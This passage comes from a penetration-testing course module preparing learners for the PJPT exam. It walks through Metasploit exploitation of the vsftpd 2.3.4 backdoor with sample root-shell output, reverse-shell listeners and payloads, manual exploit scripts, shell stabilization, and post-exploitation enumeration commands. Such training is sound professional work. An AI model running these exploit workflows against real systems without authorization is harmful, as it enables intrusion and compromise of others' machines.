   .++/.+++++++++++*+.\n                                   .+o+:..+++++++++++*+.\n                                  .+oo++::.+++++++++++*+.\n                                 .+ooo+++::.+++++++++++*+.\n                                .+oooo++++::.+++++++++++*+.\n                               .ooooooooo+++::.+++++++++++*+.\n                              .oooooooooooo+++::.+++++++++++*+.\n                             .ooooooooooooo++++::.+++++++++++*+.\n                            .oooooooooooooo+++++::.+++++++++++*+.\n                           .ooooooooooooooo++++++::.+++++++++++*+.\n                          .oooooooooooooooo+++++++::.+++++++++++*+.\n                         .ooooooooooooooooo++++++++::.+++++++++++*+.\n                        .oooooooooooooooooo+++++++++::.+++++++++++*+.\n                       .ooooooooooooooooooo++++++++++::.+++++++++++*+.\n                      .oooooooooooooooooooo+++++++++++::.+++++++++++*+.\n                     .ooooooooooooooooooooo++++++++++++::.+++++++++++*+.\n                    .oooooooooooooooooooooo+++++++++++++::.+++++++++++*+.\n                   .ooooooooooooooooooooooo++++++++++++++::.+++++++++++*+.\n        .::.`    .+ooooooooooooooooooooooo+++++++++++++++::.+++++++++++*+..::.\n     .:/+/:/:-. `ooooooooooooooooooooooooo++++++++++++++++::.+++++++++++*+.:/:/:+/:.\n   .:/:-`   .-::ooooooooooooooooooooooooo+++++++++++++++++::.+++++++++++*+::-`   .-::.\n .-/o/-`       .:oooooooooooooooooooooooo++++++++++++++++++::.+++++++++++*+:.       `-/o/-.\n`---`             .:ooooooooooooooooooooo+++++++++++++++++++::.+++++++++++*+:.             `---`\n                    .:oooooooooooooooooooo++++++++++++++++++++::.+++++++++++*+:.\n                      -::::::::::::::::::-----------------------::::::::::::::::::-\n\n       =[ metasploit v6.x.x-dev ]\n+ -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- + -- +\n\nmsf6 &gt;\n</code></pre>\n<p><strong>Basic Metasploit Workflow:</strong></p>\n<ol>\n<li><strong>Search:</strong> Find an exploit module relevant to the vulnerability you identified.<pre><code>msf6 &gt; search &lt;keyword, e.g., vsftpd&gt;\n</code></pre>\n</li>\n<li><strong>Select/Use:</strong> Choose the specific module you want to use.<pre><code>msf6 &gt; use &lt;module_path, e.g., exploit/unix/ftp/vsftpd_234_backdoor&gt;\n</code></pre>\nThe prompt will change to reflect the selected module (e.g., <code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</code>).</li>\n<li><strong>Show Options:</strong> See what configuration is needed for this module.<pre><code>msf6 exploit(...) &gt; show options\n</code></pre>\nLook for options marked &quot;yes&quot; under the &quot;Required&quot; column.</li>\n<li><strong>Set Options:</strong> Configure the required options, most commonly:<ul>\n<li><code>RHOSTS</code>: The target IP address(es).</li>\n<li><code>LHOST</code>: Your attacker machine&#39;s IP address (where the listener will be). <em>Crucial for reverse shells.</em></li>\n<li><code>LPORT</code>: The port on your attacker machine where the listener will run. <em>Crucial for reverse shells.</em></li>\n<li>Other exploit-specific options (e.g., <code>TARGETURI</code> for web exploits, credentials).</li>\n</ul>\n<pre><code>msf6 exploit(...) &gt; set RHOSTS &lt;target_ip&gt;\nmsf6 exploit(...) &gt; set LHOST &lt;your_ip&gt; # Only needed for reverse payloads\nmsf6 exploit(...) &gt; set LPORT &lt;listening_port&gt; # Only needed for reverse payloads\nmsf6 exploit(...) &gt; set &lt;other_option&gt; &lt;value&gt;\n</code></pre>\n<p>You can verify settings by typing <code>show options</code> again.</p>\n</li>\n<li><strong>Set Payload (If not default):</strong> The module might have a default payload, but you can change it if needed. Often, you&#39;ll want a standard shell payload.<pre><code>msf6 exploit(...) &gt; show payloads # See available payloads for this exploit\nmsf6 exploit(...) &gt; set PAYLOAD &lt;payload_path, e.g., cmd/unix/reverse_netcat&gt;\n</code></pre>\n</li>\n<li><strong>Run/Exploit:</strong> Execute the module.<pre><code>msf6 exploit(...) &gt; run\n# OR\nmsf6 exploit(...) &gt; exploit\n</code></pre>\n</li>\n</ol>\n<p><strong>PJPT Tip:</strong> Get comfortable with <code>msfconsole</code>. Practice this basic workflow repeatedly on vulnerable lab targets. Your speed and confidence with Metasploit will pay off significantly during the exam.</p>\n<hr>\n<h3>6.3 Using Metasploit for Common Exploits</h3>\n<p>Let&#39;s walk through a classic, simple Metasploit example often found in introductory labs: the vsftpd 2.3.4 backdoor. This vulnerability is a deliberate backdoor planted in a specific version, making it a very clean exploitation case.</p>\n<p><strong>Scenario:</strong> During enumeration (Module 4), you identified a target running vsftpd version 2.3.4 on port 21. In Module 5, you searched Exploit-DB/NVD and found that this version has a well-known backdoor (CVE-2011-2523).</p>\n<p><strong>Exploitation Steps (Metasploit):</strong></p>\n<ol>\n<li><p><strong>Launch <code>msfconsole</code>:</strong></p>\n<pre><code class=\"language-bash\">msfconsole\n</code></pre>\n</li>\n<li><p><strong>Search for the exploit:</strong></p>\n<pre><code>msf6 &gt; search vsftpd 2.3.4\n</code></pre>\n<p>Look for the <code>exploit/unix/ftp/vsftpd_234_backdoor</code> module.</p>\n</li>\n<li><p><strong>Use the exploit module:</strong></p>\n<pre><code>msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor\n</code></pre>\n<p>Your prompt should change: <code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</code></p>\n</li>\n<li><p><strong>Show options:</strong></p>\n<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options\n</code></pre>\n<p>You&#39;ll see something like this (output may vary slightly):</p>\n<pre><code>Module options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name    Required  Current Value  Description\n   ----    --------  -------------  -----------\n   RHOSTS  yes                      The target host(s), range CIDR identifiers, or hosts file\n   RPORT   yes       21             The target port (TCP)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n</code></pre>\n<p>Notice <code>RHOSTS</code> is required. This exploit is a <em>bind</em> shell, meaning the target opens a port for you to connect <em>to</em>, so <code>LHOST</code> and <code>LPORT</code> are <em>not</em> required by the exploit module itself (though you&#39;ll need <code>netcat</code> or a handler to connect <em>after</em> exploitation).</p>\n</li>\n<li><p><strong>Set the target IP (<code>RHOSTS</code>):</strong> Replace <code>&lt;target_ip&gt;</code> with the actual IP of your vulnerable machine.</p>\n<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS &lt;target_ip&gt;\n</code></pre>\n</li>\n<li><p><strong>Verify options (optional but good practice):</strong></p>\n<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options\n</code></pre>\n<p>Confirm <code>RHOSTS</code> is set correctly.</p>\n</li>\n<li><p><strong>Run the exploit:</strong></p>\n<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run\n</code></pre>\n</li>\n<li><p><strong>Expected Output (Success):</strong> If successful, the exploit will attempt to connect to port 6200 on the target (where the backdoor bind shell opens) and might automatically connect you. You should see output indicating a shell session was opened.</p>\n<pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run\n\n[*] &lt;target_ip&gt;:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] &lt;target_ip&gt;:21 - USER 3.0.3:(\n[*] &lt;target_ip&gt;:21 - 331 Please specify the password.\n[*] &lt;target_ip&gt;:21 - PASS :)\n[+] &lt;target_ip&gt;:21 - Login successful.\n[*] &lt;target_ip&gt;:6200 - Found shell.\n[*] Command shell session 1 opened (&lt;your_ip&gt;:&lt;your_port&gt; -&gt; &lt;target_ip&gt;:6200) at 2023-10-27 10:30:00 +0000\n\nid\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>\n<p>The <code>id</code> command is run automatically by the module to confirm you have root access (uid=0). You are now interacting with a shell on the target system!</p>\n</li>\n</ol>\n<p><strong>PJPT Tip:</strong> The vsftpd 2.3.4 exploit is a <em>bind</em> shell. More commonly, you&#39;ll use <em>reverse</em> shells in pentesting. This requires setting up a listener on your machine <em>before</em> running the exploit. Metasploit&#39;s <code>multi/handler</code> is perfect for this (see Section 6.5).</p>\n<hr>\n<h3>6.4 Manual Exploitation: Beyond Metasploit</h3>\n<p>While Metasploit is incredibly powerful, it doesn&#39;t have every exploit, and sometimes a simple script is all you need. This is where Exploit-DB and the <code>searchsploit</code> tool come in.</p>\n<p><strong>Scenario:</strong> You found a vulnerability (e.g., a specific web application version) that doesn&#39;t have a readily available Metasploit module, but <code>searchsploit</code> (from Module 5) showed a Python script on Exploit-DB.</p>\n<p><strong>Exploitation Steps (Manual Script):</strong></p>\n<ol>\n<li><p><strong>Find the exploit:</strong> Use <code>searchsploit</code> to find the exploit ID.</p>\n<pre><code class=\"language-bash\">searchsploit &lt;vulnerable_software&gt; &lt;version&gt;\n</code></pre>\n</li>\n<li><p><strong>Copy the exploit script:</strong> Use the <code>-m</code> (mirror) flag to copy the script to your current directory.</p>\n<pre><code class=\"language-bash\">searchsploit -m &lt;exploit_id&gt;\n</code></pre>\n<p>Example: <code>searchsploit -m 12345</code> (where 12345 is the Exploit-DB ID).</p>\n</li>\n<li><p><strong>Read the script!</strong> <strong>This is CRITICAL.</strong> You <em>must</em> understand how the script works, what it requires (arguments like IP, port, username, password), and what it&#39;s supposed to do. Open it with a text editor (<code>nano</code>, <code>vim</code>, <code>gedit</code>). Look for comments, variable names, and how it connects or interacts with the target.</p>\n<pre><code class=\"language-bash\">nano &lt;exploit_script_name.py&gt;\n</code></pre>\n</li>\n<li><p><strong>Determine requirements:</strong> Based on reading the script, figure out the command-line arguments or modifications needed (e.g., does it need the target IP as the first argument? Does it connect to a specific port?).</p>\n</li>\n<li><p><strong>Set up a Listener (if it&#39;s a reverse shell):</strong> If the script drops a reverse shell, you need a listener running <em>before</em> you execute the script. See Section 6.5.</p>\n</li>\n<li><p><strong>Execute the script:</strong> Run the script from your terminal, providing the necessary arguments.</p>\n<pre><code class=\"language-bash\">python &lt;exploit_script_name.py&gt; &lt;target_ip&gt; &lt;other_arguments&gt;\n# Or ruby, perl, ./script_name, etc., depending on the script type\n</code></pre>\n</li>\n<li><p><strong>Handle the shell:</strong> If successful, your listener should catch the shell, or the script might give you direct interaction. See Section 6.6 for basic shell handling.</p>\n</li>\n</ol>\n<p><strong>PJPT Tip:</strong> Don&#39;t just run downloaded scripts blindly. Always read the code first. This helps you understand the exploit, troubleshoot issues, and avoids potentially harmful or unexpected actions.</p>\n<hr>\n<h3>6.5 Setting Up Listeners: Catching the Shell</h3>\n<p>Most exploits, especially in practical labs, aim to give you a <em>reverse shell</em>. This means the target system initiates a connection <em>back</em> to your attacker machine. Your attacker machine needs to be listening on a specific port to <em>catch</em> this connection.</p>\n<p><strong>Why Reverse Shells?</strong> They often work better than <em>bind shells</em> (where the target opens a port you connect to) because outbound connections from a target network are less likely to be blocked by firewalls than inbound connections.</p>\n<p><strong>Two Primary Tools for Listening:</strong></p>\n<ol>\n<li><p><strong>Netcat (<code>nc</code>):</strong> Simple, reliable, lightweight.</p>\n<pre><code class=\"language-bash\">nc -lvnp &lt;LPORT&gt;\n</code></pre>\n<ul>\n<li><code>-l</code>: Listen mode</li>\n<li><code>-v</code>: Verbose output (shows connection details)</li>\n<li><code>-n</code>: Numeric-only IP addresses (no DNS lookups)</li>\n<li><code>-p &lt;LPORT&gt;</code>: Specify the listening port. Choose a high, unused port (e.g., 4444, 5555, 9001). Make sure the exploit or payload is configured to connect back to <em>this specific port</em> on your machine.</li>\n</ul>\n<p>Example:</p>\n<pre><code class=\"language-bash\">nc -lvnp 4444\n</code></pre>\n<p>This command will start a listener on port 4444. When the target successfully runs your reverse shell payload and connects back, you&#39;ll see connection details, and your netcat session will become the target&#39;s shell.</p>\n</li>\n<li><p><strong>Metasploit <code>multi/handler</code>:</strong> More robust, especially for Metasploit payloads. It&#39;s essentially a listener module within Metasploit that can handle various payload types.</p>\n<p>Steps:</p>\n<ol>\n<li>Launch <code>msfconsole</code>.</li>\n<li>Use the handler module:<pre><code>msf6 &gt; use exploit/multi/handler\n</code></pre>\n</li>\n<li>Set the <em>same</em> payload you configured in your exploit module or manual script:<pre><code>msf6 exploit(multi/handler) &gt; set PAYLOAD &lt;payload_path, e.g., cmd/unix/reverse_bash&gt;\n</code></pre>\n</li>\n<li>Set your attacker IP (<code>LHOST</code>) and listening port (<code>LPORT</code>). These <em>must</em> match the IP and port the target is connecting <em>back to</em>.<pre><code>msf6 exploit(multi/handler) &gt; set LHOST &lt;your_ip&gt;\nmsf6 exploit(multi/handler) &gt; set LPORT &lt;listening_port&gt;\n</code></pre>\n</li>\n<li>Set <code>ExitOnSession</code> to <code>false</code> (optional but recommended) so the handler keeps listening even after one session connects.<pre><code>msf6 exploit(multi/handler) &gt; set ExitOnSession false\n</code></pre>\n</li>\n<li>Run the handler:<pre><code>msf6 exploit(multi/handler) &gt; run\n</code></pre>\n</li>\n</ol>\n<p>Metasploit will now listen. When the target connects back, you&#39;ll see a session opened, and you can interact with it using commands like <code>sessions -l</code> (list sessions) and <code>sessions -i &lt;id&gt;</code> (interact with a session).</p>\n</li>\n</ol>\n<p><strong>PJPT Tip:</strong> Always start your listener <em>before</em> executing the exploit or script that will send the reverse shell. If the exploit runs but your listener isn&#39;t ready, you miss the connection and have to try again.</p>\n<hr>\n<h3>6.6 Executing Exploits and Troubleshooting</h3>\n<p>You&#39;ve identified a vulnerability, chosen your tool (Metasploit or manual script), configured your listener, and are ready to fire. What happens when it doesn&#39;t work? This is where the practical skills come in.</p>\n<p><strong>Execution:</strong></p>\n<ul>\n<li>If using Metasploit, use the <code>run</code> or <code>exploit</code> command after setting options.</li>\n<li>If using a manual script, execute it from your terminal with the correct arguments, ensuring your listener is running if needed.</li>\n</ul>\n<p><strong>Common Troubleshooting Steps:</strong></p>\n<ol>\n<li><p><strong>Double-check Your Setup:</strong></p>\n<ul>\n<li>Is the target IP correct (<code>RHOSTS</code>)?</li>\n<li>Is your attacker IP correct (<code>LHOST</code>)?</li>\n<li>Are the listening ports (<code>LPORT</code>) configured correctly on <em>both</em> your listener and the exploit/payload? This is a very common mistake!</li>\n<li>Are all required Metasploit options set (<code>show options</code>)?</li>\n<li>Did you read the manual script&#39;s instructions/code carefully?</li>\n</ul>\n</li>\n<li><p><strong>Verify Connectivity:</strong> Can your attacker machine reach the target IP and port?</p>\n<ul>\n<li><code>ping &lt;target_ip&gt;</code> (ICMP might be blocked, but worth a try).</li>\n<li><code>nc -vz &lt;target_ip&gt; &lt;target_port&gt;</code> (Check if the service port is open and reachable).</li>\n<li><code>nc -vz &lt;target_ip&gt; &lt;LPORT&gt;</code> (If using a bind shell, check if the bind port is open after running the exploit).</li>\n</ul>\n</li>\n<li><p><strong>Firewalls:</strong> Is there a firewall blocking the connection, especially the return connection for a reverse shell? This is harder to check directly, but if connectivity tests pass but the shell doesn&#39;t arrive, consider this. Sometimes trying a different reverse shell port (e.g., 80, 443, 53) <em>might</em> bypass basic firewall rules if they only block common malicious ports, but rely on your enumeration findings first!</p>\n</li>\n<li><p><strong>Incorrect Exploit/Payload:</strong></p>\n<ul>\n<li>Are you <em>sure</em> the target version matches the exploit? Even minor version differences can matter.</li>\n<li>Is the payload compatible with the target OS/architecture? (Metasploit usually handles this, but manual scripts might be specific).</li>\n<li>Try a different payload type if available (e.g., <code>cmd/unix/reverse_bash</code> instead of <code>cmd/unix/reverse_netcat</code>).</li>\n</ul>\n</li>\n<li><p><strong>Target Patched/Different Configuration:</strong> The most frustrating one. The vulnerability you found during enumeration might have been patched since your scan, or the target&#39;s configuration prevents the exploit from working as expected. Your enumeration might have been slightly off, or the practice environment was updated.</p>\n</li>\n<li><p><strong>Go Back to Enumeration:</strong> If exploitation fails repeatedly, <em>revisit your enumeration</em>. Did you miss a service? Misidentify a version? Find any other interesting details (users, config files, other open ports) that might offer an alternative attack vector? Sometimes the &quot;obvious&quot; exploit isn&#39;t the intended path.</p>\n</li>\n</ol>\n<p><strong>PJPT Tip:</strong> Don&#39;t get stuck on one failed exploit attempt for too long. If it&#39;s not working after confirming your basic setup and checking common issues, note it down and move on to try exploiting a different vulnerability you found, or revisit enumeration for more clues. Time management is key in the exam.</p>\n<hr>\n<h3>6.7 Handling Shells: Basic Stabilization</h3>\n<p>Congratulations! You&#39;ve gained a shell. You&#39;ll likely land in a basic, non-interactive shell. This means no command history (up/down arrows), no tab completion, and issues with programs that need a proper terminal (like <code>su</code>, <code>sudo</code>, text editors).</p>\n<p>To make working on the target easier, you need to stabilize the shell and get a proper TTY (Teletypewriter) session.</p>\n<p><strong>Basic Shell Stabilization (Python):</strong></p>\n<p>This is a common and effective technique for Linux targets:</p>\n<ol>\n<li><p>Once you have the initial shell (e.g., via netcat or Metasploit session), type:</p>\n<pre><code class=\"language-bash\">python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;\n</code></pre>\n<p>(If <code>/bin/bash</code> isn&#39;t available, try <code>/bin/sh</code>).<br>This uses Python to spawn a new process (<code>/bin/bash</code> or <code>/bin/sh</code>) with a pseudo-terminal, giving you basic TTY features.</p>\n</li>\n<li><p>You still might have some issues. The next step is to background the current process in your attacker terminal (Ctrl+Z).</p>\n</li>\n<li><p>Back in your attacker terminal&#39;s main shell (Kali/Parrot), type:</p>\n<pre><code class=\"language-bash\">stty raw -echo; fg\n</code></pre>\n<ul>\n<li><code>stty raw -echo</code>: Configures your terminal settings so that keystrokes are sent directly without echoing, and special characters (like Ctrl+C) are handled by the remote shell, not your local one.</li>\n<li><code>fg</code>: Brings the backgrounded process (your shell session) back to the foreground.</li>\n</ul>\n</li>\n<li><p>If successful, you should now have a fully interactive shell with command history, tab completion, and proper handling of signals like Ctrl+C. You can test with <code>Ctrl+L</code> (clear screen) or using up arrow.</p>\n</li>\n</ol>\n<p><strong>PJPT Tip:</strong> Stabilizing the shell is often necessary to run post-exploitation commands effectively. Practice the Python <code>pty</code> trick and the <code>stty raw -echo; fg</code> sequence until it&#39;s muscle memory.</p>\n<hr>\n<h3>6.8 Real-world Example Walkthrough (Simplified)</h3>\n<p>Let&#39;s recap the vsftpd 2.3.4 example (Section 6.3) as</p>\n\n                </div>\n             </div>\n         ",
    "module-7": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 7: module_7</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, you&#39;ve done it! You&#39;ve successfully navigated the initial phases – finding your target, scanning for open doors, digging deep into services, identifying weaknesses, and most importantly, gaining that initial foothold. That moment when you get a shell is pure gold!</p>\n<p>But what happens <em>after</em> you get in? You&#39;re on a system, but you might be a low-privileged user. You need to understand your environment, see what&#39;s around, and figure out your next move.</p>\n<p>Welcome to <strong>Module 7: After the Breach: Basic Post-Exploitation &amp; Reinforcement</strong>. This module is about taking those crucial first steps <em>inside</em> the target network and, just as importantly, solidifying everything you&#39;ve learned so far into unbreakable command-line muscle memory.</p>\n<hr>\n<h2>Module 7: After the Breach: Basic Post-Exploitation &amp; Reinforcement</h2>\n<ul>\n<li><strong>Module Objective:</strong> Learners will perform basic post-exploitation tasks to gather system information and reinforce their command-line muscle memory across the entire workflow by revisiting previous steps on exploited targets.</li>\n<li><strong>Connection to Previous Modules:</strong> You&#39;ve just completed Module 6 where you gained initial access. This module picks up <em>right there</em>, inside the compromised system. It then loops back to Modules 2-5 for the crucial reinforcement exercise.</li>\n<li><strong>Why This Module is Important for PJPT:</strong> The PJPT is practical. Getting a shell is fantastic, but the exam might require you to gather specific information <em>from</em> that shell (evidence, system details). Also, being fast and accurate with your core Recon, Scan, and Enum commands under exam pressure requires repetition – lots of it! This module tackles both.</li>\n</ul>\n<hr>\n<h3><strong>Section 7.1: Introduction to Post-Exploitation</strong></h3>\n<p>You&#39;re in! Celebrate for a second, but then it&#39;s time to get to work. Post-exploitation is simply everything you do <em>after</em> gaining initial access to a system.</p>\n<ul>\n<li><strong>What is Post-Exploitation?</strong> It&#39;s the phase where you interact with the compromised system from the <em>inside</em>. Your goals might include:<ul>\n<li>Understanding the system&#39;s configuration and purpose.</li>\n<li>Gathering sensitive data.</li>\n<li>Identifying other systems to pivot to.</li>\n<li>Establishing persistence (making sure you can get back in).</li>\n<li>Increasing your privileges (Privilege Escalation).</li>\n</ul>\n</li>\n<li><strong>PJPT Scope Focus:</strong> For the PJPT, the post-exploitation phase is generally focused on <em>basic information gathering</em> and demonstrating you can interact with the system. Complex privilege escalation or advanced lateral movement might be beyond the core requirements, but understanding <em>where you are</em> and <em>who you are</em> is essential. This is where we&#39;ll focus.</li>\n</ul>\n<hr>\n<h3><strong>Section 7.2: Gathering Basic System Information</strong></h3>\n<p>The absolute first things you want to know when you land on a system are:</p>\n<ol>\n<li><strong>Who am I?</strong> (What user did I compromise/land as?)</li>\n<li><strong>What privileges do I have?</strong></li>\n<li><strong>What system am I on?</strong> (Hostname, OS, version)</li>\n<li><strong>What network configuration does it have?</strong> (IPs, interfaces)</li>\n<li><strong>What services are running <em>locally</em> or listening on internal interfaces?</strong></li>\n</ol>\n<p>Let&#39;s look at the commands to answer these questions on a typical Linux system (which is common in PJPT-like scenarios and practice labs).</p>\n<p><strong>Command 1: <code>whoami</code></strong></p>\n<ul>\n<li><strong>Purpose:</strong> Tells you the effective username of the current user.</li>\n<li><strong>When to Use:</strong> Immediately after getting a shell.</li>\n<li><strong>Syntax:</strong><pre><code class=\"language-bash\">whoami\n</code></pre>\n</li>\n<li><strong>Example Output:</strong><pre><code>www-data\n</code></pre>\nor<pre><code>root\n</code></pre>\n</li>\n<li><strong>What to Look For:</strong> Are you <code>root</code>? Great! (Though less common for initial shells). Are you a service user like <code>www-data</code> or <code>mysql</code>? This tells you about the context of the compromise and your initial limitations.</li>\n<li><strong>Action for Your Guide:</strong> Add <code>whoami</code> to your &quot;Post-Exploitation&quot; section. Include the command, explain its purpose (&quot;Identifies the current effective user&quot;), and show example output.</li>\n</ul>\n<p><strong>Command 2: <code>id</code></strong></p>\n<ul>\n<li><strong>Purpose:</strong> Provides more detailed information about the current user, including their User ID (UID), Group ID (GID), and all groups they belong to.</li>\n<li><strong>When to Use:</strong> Right after <code>whoami</code> for more detail on permissions.</li>\n<li><strong>Syntax:</strong><pre><code class=\"language-bash\">id\n</code></pre>\n</li>\n<li><strong>Example Output:</strong><pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre>\nor<pre><code>uid=0(root) gid=0(root) groups=0(root)\n</code></pre>\nor (for a standard user)<pre><code>uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users)\n</code></pre>\n</li>\n<li><strong>What to Look For:</strong> The UID and GID. The <code>groups</code> list is very important! Are you part of the <code>sudo</code> group? This is a major finding for potential privilege escalation (though remember PJPT focus). Even belonging to groups like <code>adm</code> or <code>disk</code> can sometimes grant unexpected permissions.</li>\n<li><strong>Action for Your Guide:</strong> Add <code>id</code> to your &quot;Post-Exploitation&quot; section. Explain its purpose (&quot;Shows user, group, and supplementary group IDs&quot;), and show example output, highlighting what the <code>groups</code> section indicates.</li>\n</ul>\n<p><strong>Command 3: <code>hostname</code></strong></p>\n<ul>\n<li><strong>Purpose:</strong> Displays the system&#39;s hostname.</li>\n<li><strong>When to Use:</strong> To identify the specific machine you are on, especially in a network with multiple hosts.</li>\n<li><strong>Syntax:</strong><pre><code class=\"language-bash\">hostname\n</code></pre>\n</li>\n<li><strong>Example Output:</strong><pre><code>target-web-srv\n</code></pre>\n</li>\n<li><strong>What to Look For:</strong> The name of the system. This is crucial for your documentation and reporting – you need to know <em>which</em> system you compromised.</li>\n<li><strong>Action for Your Guide:</strong> Add <code>hostname</code> to your &quot;Post-Exploitation&quot; section. Explain its purpose (&quot;Identifies the system&#39;s network name&quot;), and show example output.</li>\n</ul>\n<p><strong>Command 4: <code>ip a</code> (or <code>ifconfig</code>)</strong></p>\n<ul>\n<li><strong>Purpose:</strong> Shows the network interface addresses and configuration.</li>\n<li><strong>When to Use:</strong> To understand the system&#39;s network connectivity.</li>\n<li><strong>Syntax:</strong><pre><code class=\"language-bash\">ip a\n# or (older/alternative)\nifconfig\n</code></pre>\n</li>\n<li><strong>Example Output (<code>ip a</code>):</strong><pre><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\n    link/ether 08:00:27:xx:xx:xx brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.105/24 brd 192.168.1.255 scope global dynamic eth0\n       valid_lft 84886sec preferred_lft 84886sec\n    inet6 fe80::a00:27ff:fexx:xxxx/64 scope link\n       valid_lft forever preferred_lft forever\n</code></pre>\n</li>\n<li><strong>What to Look For:</strong> The IP addresses assigned to the interfaces (<code>eth0</code>, <code>eth1</code>, etc.). Are there multiple interfaces? Are they on different subnets? This tells you if the system is multi-homed and could potentially be a pivot point to another network segment (again, maybe beyond PJPT, but good info to gather). Note the network (<code>/24</code> in the example) and default gateway (often the first IP in the subnet).</li>\n<li><strong>Action for Your Guide:</strong> Add <code>ip a</code> (and optionally <code>ifconfig</code>) to your &quot;Post-Exploitation&quot; section. Explain its purpose (&quot;Displays network interface information and IP addresses&quot;), show example output, and note what information to extract (IPs, interfaces, network mask).</li>\n</ul>\n<p><strong>Command 5: <code>netstat -tulnp</code></strong></p>\n<ul>\n<li><strong>Purpose:</strong> Shows active network connections and listening ports. The flags break down as:<ul>\n<li><code>-t</code>: TCP connections</li>\n<li><code>-u</code>: UDP connections</li>\n<li><code>-l</code>: Listening sockets</li>\n<li><code>-n</code>: Numeric addresses (don&#39;t resolve hostnames/ports) - makes output faster and clearer.</li>\n<li><code>-p</code>: Show the PID and program name associated with the connection/port (requires appropriate privileges, sometimes root).</li>\n</ul>\n</li>\n<li><strong>When to Use:</strong> To see what services are running <em>on the system itself</em> and listening on which ports. This is internal enumeration!</li>\n<li><strong>Syntax:</strong><pre><code class=\"language-bash\">netstat -tulnp\n</code></pre>\n</li>\n<li><strong>Example Output:</strong><pre><code>Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1234/mysqld\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5678/apache2\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      9101/sshd\ntcp6       0      0 :::80                   :::*                    LISTEN      5678/apache2\ntcp6       0      0 :::22                   :::*                    LISTEN      9101/sshd\n</code></pre>\n</li>\n<li><strong>What to Look For:</strong> Any services listening on <code>127.0.0.1</code> (localhost - only accessible from the system itself) or <code>0.0.0.0</code> (all interfaces - accessible externally or internally). Are there databases (3306)? Internal web services? Other unexpected services? Note the associated program name if the <code>-p</code> flag works. This is valuable internal enumeration data.</li>\n<li><strong>Action for Your Guide:</strong> Add <code>netstat -tulnp</code> to your &quot;Post-Exploitation&quot; section. Explain its purpose (&quot;Lists listening network services and their associated programs&quot;), show example output, and explain what the different columns and addresses mean (Local Address, Foreign Address, State, PID/Program name, 127.0.0.1 vs 0.0.0.0).</li>\n</ul>\n<p><strong>Command 6: Identifying OS and Kernel Version</strong></p>\n<ul>\n<li><strong>Purpose:</strong> To determine the exact operating system distribution and kernel version. This is critical for identifying potential operating system or kernel-level vulnerabilities.</li>\n<li><strong>When to Use:</strong> After gaining access, as part of system information gathering.</li>\n<li><strong>Syntax:</strong><pre><code class=\"language-bash\">uname -a\n# and/or\ncat /etc/os-release\n# or look in common locations like /etc/*release\n</code></pre>\n</li>\n<li><strong>Example Output (<code>uname -a</code>):</strong><pre><code>Linux target-web-srv 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:11:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre>\n</li>\n<li><strong>Example Output (<code>cat /etc/os-release</code>):</strong><pre><code>NAME=&quot;Ubuntu&quot;\nVERSION=&quot;18.04.3 LTS (Bionic Beaver)&quot;\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME=&quot;Ubuntu 18.04.3 LTS&quot;\nVERSION_ID=&quot;18.04&quot;\nHOME_URL=&quot;https://www.ubuntu.com/&quot;\nSUPPORT_URL=&quot;https://help.ubuntu.com/&quot;\nBUG_REPORT_URL=&quot;https://bugs.launchpad.net/ubuntu/&quot;\nPRIVACY_POLICY_URL=&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;\nVERSION_CODENAME=bionic\nUBUNTU_CODENAME=bionic\n</code></pre>\n</li>\n<li><strong>What to Look For:</strong> The distribution name (Ubuntu, Debian, CentOS, etc.), the version number (18.04, 7, etc.), and the kernel version (<code>4.15.0-58-generic</code> in the <code>uname -a</code> example). These details can be fed into vulnerability databases later.</li>\n<li><strong>Action for Your Guide:</strong> Add these commands/file paths to your &quot;Post-Exploitation&quot; section. Explain their purpose (&quot;Identifies the operating system distribution, version, and kernel&quot;), show example output for both, and explain what key information to extract from the output.</li>\n</ul>\n<hr>\n<h3><strong>Section 7.3: Locating Potential Sensitive Files (Manual Checks)</strong></h3>\n<p>While automated tools exist, for basic post-exploitation and PJPT scope, knowing where to look manually is key. You&#39;re looking for configuration files, logs, user data, or anything that might contain credentials or other valuable information.</p>\n<ul>\n<li><p><strong>Common Places to Look:</strong></p>\n<ul>\n<li><strong>User Home Directories:</strong> <code>/home/&lt;username&gt;/</code> or <code>~</code> (if you are in the user&#39;s home). Look for configuration files (<code>.bashrc</code>, <code>.ssh</code>, application-specific config).</li>\n<li><strong>Web Server Roots:</strong> 